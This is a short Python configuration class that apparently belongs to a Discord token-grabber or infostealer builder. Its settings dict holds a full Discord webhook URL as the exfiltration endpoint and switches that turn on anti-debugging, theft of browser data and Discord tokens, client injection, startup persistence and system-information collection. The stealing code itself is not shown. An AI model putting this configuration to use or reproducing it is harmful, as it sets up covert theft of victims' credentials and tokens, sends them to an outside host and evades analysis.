class Config:
    """
    The Config class creates the questions that will be prompted to the user
    and return the configuration data
    """

    def __init__(self) -> None:
        pass

    def get_config(self) -> dict:
        """
        Return the config data without prompting the user
        """
        return {
            "webhook": "https://discord.com/api/webhooks/1307463639250243584/oKzeUlT8a6peM9svCfYjiDAKCcg0efP4stXHxGoQD6MrylIJXxV_iF67w91Nt-UjqaVq",  # Set the desired webhook URL
            "antidebug": True,
            "browsers": True,
            "discordtoken": True,
            "injection": True,
            "startup": True,
            "systeminfo": True,
        }
